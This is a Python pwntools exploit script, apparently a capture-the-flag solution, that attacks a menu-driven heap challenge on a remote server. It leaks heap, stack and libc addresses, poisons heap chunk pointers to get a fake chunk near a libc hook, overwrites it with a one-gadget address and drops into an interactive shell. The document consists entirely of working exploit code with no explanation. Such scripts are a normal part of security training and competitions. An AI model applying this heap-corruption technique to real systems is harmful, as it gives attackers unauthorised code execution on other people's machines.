from pwn import *

HOST = "chal.noxale.com"
PORT = 1232
REMOTE = 1
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('13.125.131.113',PORT)
def empty_alloc(t,n):
  s.recvuntil('7. Exit')
  s.sendline('3')
  s.recvuntil('3. Large')
  s.sendline(str(t))
  s.recvuntil('How many items would you like to add?')
  s.sendline(str(n))
def remove(i):
  s.recvuntil('7. Exit')
  s.sendline('4')
  s.recvuntil('?')
  s.sendline(str(i))
def view():
  s.recvuntil('7. Exit')
  s.sendline('1')
def stack_leak():
  s.recvuntil('7. Exit')
  s.sendline('6')
def edit(i,dat):
  s.recvuntil('7. Exit')
  s.sendline('5')
  s.recvuntil('?')
  s.sendline(str(i))
  s.recvuntil(':')
  s.sendline(dat)


empty_alloc(1,3)
remove(0)
remove(0)
empty_alloc(1,1)
view()
s.recvuntil('----------')
heap = u64(s.recvuntil('----')[8:8+6]+'\x00\x00')
print "heap :", hex(heap)
stack_leak()
view()
s.recvuntil('----------')
stack = u64(s.recvuntil('----------')[0x12:0x12+6]+'\x00\x00')
print "stack :", hex(stack)
stack_chunk = stack-0x13-0x8
remove(0)
edit(0,"A"*0x18+p64(0x21)+p64(stack_chunk))
empty_alloc(1,2)
view()
s.recvuntil('----------')
libc = u64(s.recvuntil('----------')[0x35:0x35+6]+'\x00\x00')-0x20830 # __libc_start_main+240
print "libc :",hex(libc)
edit(3,"A"*8+p64(0))
fake_chunk = libc+0x3c4aed
empty_alloc(3,2)
remove(4)
edit(2,"A"*0x18+p64(0x71)+p64(fake_chunk))
empty_alloc(3,2)
edit(6,"A"*0x13+p64(libc+0xf02a4))
#empty_alloc(1,1)
s.interactive()
